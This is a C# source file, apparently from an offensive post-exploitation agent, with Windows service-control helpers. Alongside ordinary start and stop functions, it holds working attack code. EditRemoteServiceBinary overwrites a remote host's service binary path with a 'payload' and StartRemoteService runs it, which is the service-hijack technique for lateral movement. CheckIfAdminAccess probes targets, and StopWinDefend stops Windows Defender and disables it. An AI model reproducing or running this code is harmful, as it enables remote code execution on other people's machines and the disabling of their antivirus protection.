using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ComponentModel;
using System.ServiceProcess;

namespace Agent.Internal
{
    public static class Services
    {
        public static bool EditLocalServiceStartType(string serviceName, uint startType)
        {
            var scManagerHandle = Native.Advapi.OpenSCManager(null, null, Native.Advapi.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                return false;
            }

            var serviceHandle = Native.Advapi.OpenService(scManagerHandle, serviceName, Native.Advapi.SERVICE_ALL_ACCESS);

            if (serviceHandle == IntPtr.Zero)
            {
                int nError = Marshal.GetLastWin32Error();
                var win32Exception = new Win32Exception(nError);
                return false;
            }
            var result = Native.Advapi.ChangeServiceConfig(serviceHandle, Native.Advapi.SERVICE_NO_CHANGE, startType, Native.Advapi.SERVICE_NO_CHANGE, null, null, IntPtr.Zero, null, null, null, null);
            if (result == false)
            {
                int nError = Marshal.GetLastWin32Error();
                var win32Exception = new Win32Exception(nError);
                return false;
            }
            Native.Advapi.CloseServiceHandle(serviceHandle);
            Native.Advapi.CloseServiceHandle(scManagerHandle);
            return true;
        }

        public static bool EditRemoteServiceBinary(string target, string serviceName, string payload)
        {
            var scManagerHandle = Native.Advapi.OpenSCManager(target, null, Native.Advapi.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                return false;
            }

            var serviceHandle = Native.Advapi.OpenService(scManagerHandle, serviceName, Native.Advapi.SERVICE_ALL_ACCESS);

            if (serviceHandle == IntPtr.Zero)
            {
                return false;
            }
            var result = Native.Advapi.ChangeServiceConfig(serviceHandle, Native.Advapi.SERVICE_NO_CHANGE, 3, Native.Advapi.SERVICE_ERROR_IGNORE, payload, null, IntPtr.Zero, null, null, null, null);
            if (result == false)
            {
                int nError = Marshal.GetLastWin32Error();
                var win32Exception = new Win32Exception(nError);
                return false;
            }
            Native.Advapi.CloseServiceHandle(serviceHandle);
            Native.Advapi.CloseServiceHandle(scManagerHandle);
            return true;
        }

        public static bool StartRemoteService(string target, string serviceName)
        {
            var scManagerHandle = Native.Advapi.OpenSCManager(target, null, Native.Advapi.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                return false;
            }

            var serviceHandle = Native.Advapi.OpenService(scManagerHandle, serviceName, Native.Advapi.SERVICE_ALL_ACCESS); // all accesss

            if (serviceHandle == IntPtr.Zero)
            {
                return false;
            }
            var res = Native.Advapi.StartService(serviceHandle, 0, null);
            Native.Advapi.CloseServiceHandle(serviceHandle);
            Native.Advapi.CloseServiceHandle(scManagerHandle);
            return res;
        }
        public static bool StopRemoteService(string target, string serviceName)
        {
            var scManagerHandle = Native.Advapi.OpenSCManager(target, null, Native.Advapi.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                return false;
            }

            var serviceHandle = Native.Advapi.OpenService(scManagerHandle, serviceName, Native.Advapi.SERVICE_ALL_ACCESS); // all accesss
            if (serviceHandle == IntPtr.Zero)
            {
                return false;
            }
            Native.Advapi.SERVICE_STATUS status = new Native.Advapi.SERVICE_STATUS();
            var res = Native.Advapi.ControlService(serviceHandle, Native.Advapi.SERVICE_CONTROL.STOP, ref status);
            if (!res)
            {
                Native.Advapi.CloseServiceHandle(serviceHandle);
                Native.Advapi.CloseServiceHandle(scManagerHandle);
                return res;

            }
            Native.Advapi.CloseServiceHandle(serviceHandle);
            Native.Advapi.CloseServiceHandle(scManagerHandle);
            return res;
        }
        public static int StartService(string serviceName)
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == serviceName)
                {
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        service.Start();
                        service.WaitForStatus(ServiceControllerStatus.Running);
                        return 0;
                    }
                    else
                    {
                        return 0;
                    }

                }
            }
            return 1;
        }
        public static void ChangeStartMode(ServiceController svc, ServiceStartMode mode)
        {
            var scManagerHandle = Native.Advapi.OpenSCManager(null, null, Native.Advapi.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                throw new ExternalException("Open Service Manager Error");
            }

            var serviceHandle = Native.Advapi.OpenService(
                scManagerHandle,
                svc.ServiceName,
                Native.Advapi.SERVICE_QUERY_CONFIG | Native.Advapi.SERVICE_CHANGE_CONFIG);

            if (serviceHandle == IntPtr.Zero)
            {
                throw new ExternalException("Open Service Error");
            }

            var result = Native.Advapi.ChangeServiceConfig(
                serviceHandle,
                Native.Advapi.SERVICE_NO_CHANGE,
                (uint)mode,
                Native.Advapi.SERVICE_NO_CHANGE,
                null,
                null,
                IntPtr.Zero,
                null,
                null,
                null,
                null);

            if (result == false)
            {
                int nError = Marshal.GetLastWin32Error();
                var win32Exception = new Win32Exception(nError);
                throw new ExternalException("Could not change service start type: "
                    + win32Exception.Message);
            }

            Native.Advapi.CloseServiceHandle(serviceHandle);
            Native.Advapi.CloseServiceHandle(scManagerHandle);
        }

        public enum SimpleServiceCustomCommands
        { StopWorker = 128, RestartWorker, CheckWorker };
        public static bool StopWinDefend()
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == "WinDefend")
                {
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        return false;
                    }
                    service.Stop();
                    service.WaitForStatus(ServiceControllerStatus.Stopped);
                    ChangeStartMode(service, ServiceStartMode.Disabled);
                    return false;
                }
            }
            return true;
        }

        public static bool StartWinDefend()
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == "WinDefend")
                {
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        ChangeStartMode(service, ServiceStartMode.Automatic);
                        service.Start();
                        service.WaitForStatus(ServiceControllerStatus.StartPending);
                        return false;
                    }
                    return false;
                }
            }
            return true;
        }
        public static bool StartTrustedInstaller()
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == "TrustedInstaller")
                {
                    if (service.StartType == ServiceStartMode.Disabled)
                    {
                        ChangeStartMode(service, ServiceStartMode.Manual);
                    }
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        service.Start();
                        service.WaitForStatus(ServiceControllerStatus.Running);
                        return true;
                    }
                    else
                    {
                        return true;
                    }

                }
            }
            return false;
        }

        public static int StopService(string serviceName)
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();
            foreach (ServiceController service in scServices)
            {
                if (service.ServiceName == serviceName)
                {
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        return 0;
                    }
                    service.Stop();
                    service.WaitForStatus(ServiceControllerStatus.Stopped);
                    return 0;
                }
            }
            return 1;
        }

        public static bool CheckIfAdminAccess(string target)
        {
            if (Native.Advapi.OpenSCManager(target, null, Native.Advapi.SC_MANAGER_ALL_ACCESS) == IntPtr.Zero)
                return false;
            return true;
        }

        public static bool QueryRemoteServiceBinaryPath(string target, string serviceName, ref string binaryPath)
        {
            var scManagerHandle = Native.Advapi.OpenSCManager(target, null, Native.Advapi.SC_MANAGER_ALL_ACCESS);
            if (scManagerHandle == IntPtr.Zero)
            {
                return false;
            }

            var serviceHandle = Native.Advapi.OpenService(scManagerHandle, serviceName, Native.Advapi.SERVICE_ALL_ACCESS);

            if (serviceHandle == IntPtr.Zero)
            {
                return false;
            }
            uint structSz;
            Native.Advapi.QueryServiceConfig(serviceHandle, IntPtr.Zero, 0, out structSz);
            // create buffer to hold config
            IntPtr ptr = Marshal.AllocHGlobal((int)structSz);
            var success = Native.Advapi.QueryServiceConfig(serviceHandle, ptr, structSz, out structSz);
            if (!success)
            {
                Marshal.FreeHGlobal(ptr);
                return false;
            }
            Native.Advapi.QueryServiceConfigStruct configStruct = (Native.Advapi.QueryServiceConfigStruct)Marshal.PtrToStructure(ptr, typeof(Native.Advapi.QueryServiceConfigStruct));
            string path = Marshal.PtrToStringAuto(configStruct.binaryPathName);
            Marshal.FreeHGlobal(ptr);
            binaryPath = path;
            Native.Advapi.CloseServiceHandle(serviceHandle);
            Native.Advapi.CloseServiceHandle(scManagerHandle);
            return true;
        }
        public static ServiceController[] GetServices()
        {
            return ServiceController.GetServices();
        }
    }
}
